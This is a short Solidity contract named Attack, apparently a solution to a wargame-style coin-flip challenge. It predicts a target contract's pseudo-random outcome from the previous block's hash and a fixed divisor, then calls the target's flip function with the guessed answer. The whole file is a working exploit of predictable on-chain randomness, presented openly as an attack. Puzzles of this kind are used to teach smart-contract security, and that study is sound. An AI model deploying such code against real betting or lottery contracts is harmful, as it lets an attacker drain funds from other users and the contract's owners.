pragma solidity ^0.8.0;

interface I {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    I flip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
  

    uint lastHash;

    constructor(address _flip) {
        flip = I(_flip);
    }

    function getAnswer() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));

        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }

    function attack() external {
        
            bool answer = getAnswer();

            flip.flip(answer);
        }
    
}